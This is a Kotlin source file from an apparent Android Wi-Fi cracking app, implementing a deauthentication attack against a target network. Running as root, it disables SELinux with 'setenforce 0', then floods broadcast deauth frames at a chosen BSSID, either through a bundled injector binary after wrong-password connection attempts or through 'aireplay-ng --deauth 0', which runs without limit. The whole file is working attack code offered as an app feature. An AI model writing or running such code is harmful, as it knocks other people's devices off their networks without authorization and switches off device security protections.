package com.wificracker.attack.domain.attacks

import com.wificracker.attack.model.Attack
import com.wificracker.core.root.BinaryInstaller
import com.wificracker.core.root.ShellExecutor
import com.wificracker.core.wifi.ChipsetMonitorHelper
import com.wificracker.core.wifi.WifiChipVendor
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.flowOn
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class DeauthAttack @Inject constructor(
    private val shellExecutor: ShellExecutor,
    private val binaryInstaller: BinaryInstaller,
    private val chipsetMonitorHelper: ChipsetMonitorHelper,
) : WifiAttack {
    override fun execute(attack: Attack): Flow<String> = flow {
        val chipInfo = chipsetMonitorHelper.detectChipVendor()

        if (chipInfo.vendor == WifiChipVendor.MEDIATEK && chipInfo.patchInstalled) {
            // MTK patched driver: connection-based deauth
            // Connect with wrong password to lock on-channel, then deauth via nl80211
            val dir = "/data/local/tmp/wificracker"
            emit("[*] MTK deauth on ${attack.targetSsid} (${attack.targetBssid})")
            shellExecutor.executeAsRoot("setenforce 0")

            var count = 0
            while (count < 50) {
                // Lock on channel via connection attempt (every 10 rounds)
                if (count % 10 == 0) {
                    emit("[*] Locking on-channel via connection attempt...")
                    shellExecutor.executeAsRoot("cmd wifi connect-network \"${attack.targetSsid}\" wpa2 \"deauth_${count}\" 2>/dev/null")
                    delay(3000)
                }
                // Deauth via nl80211 CMD_FRAME (works during offchannel window)
                shellExecutor.executeAsRoot("$dir/deauth_inject wlan0 ${attack.targetBssid} ff:ff:ff:ff:ff:ff 5 2452 2>/dev/null")
                count += 5
                if (count % 10 == 0) {
                    emit("[*] Sent $count deauth frames to ${attack.targetBssid}")
                }
                delay(200)
            }
            emit("[+] Deauth attack completed: $count frames sent")
        } else {
            // Standard: aireplay-ng (requires monitor mode + USB adapter)
            val binary = binaryInstaller.getBinaryPath("aireplay-ng")
            emit("[*] Starting aireplay-ng deauth on ${attack.targetBssid}")
            val cmd = "$binary --deauth 0 -a ${attack.targetBssid} ${attack.interfaceName}"
            shellExecutor.executeAsRoot(cmd)
            emit("[+] Deauth packets sent to ${attack.targetBssid}")
        }
    }.flowOn(Dispatchers.IO)

    override fun stop(attack: Attack) {
        shellExecutor.executeAsRoot("pkill -f 'aireplay-ng.*${attack.targetBssid}' 2>/dev/null")
    }
}
